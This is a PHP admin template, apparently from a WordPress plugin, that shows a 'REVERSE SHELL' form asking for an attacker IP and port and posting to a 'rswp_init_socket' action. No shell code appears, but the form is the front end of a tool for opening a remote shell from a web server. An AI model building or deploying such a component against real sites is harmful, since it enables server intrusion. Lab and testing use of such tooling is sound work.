<?php if (!defined('ABSPATH')) exit; ?>

<div class="rswp-ui">
    <h1 class="text-center mt-4 mb-3 text-red">REVERSE SHELL </h1>

    <div class="full-center">
      
        <form class="form-box panel-box" method="post" action="<?php echo admin_url('admin-post.php'); ?>">
            
            <input type="hidden" name="action" value="rswp_init_socket">
            
            <div class="mb-3">
                <label class="form-label">ATTACKER IP</label>
                <input type="text" name="attacker_ip" placeholder="192.168.10.100" class="form-control" required>
            </div>

            <div class="mb-3">
                <label class="form-label">ATTACKER PORT</label>
                <input type="number" name="attacker_port" placeholder="4444" class="form-control" required>
            </div>

            <button type="submit" class="btn btn-primary w-100 py-3">
                SUBMIT
            </button>

        </form>

    </div>
</div>


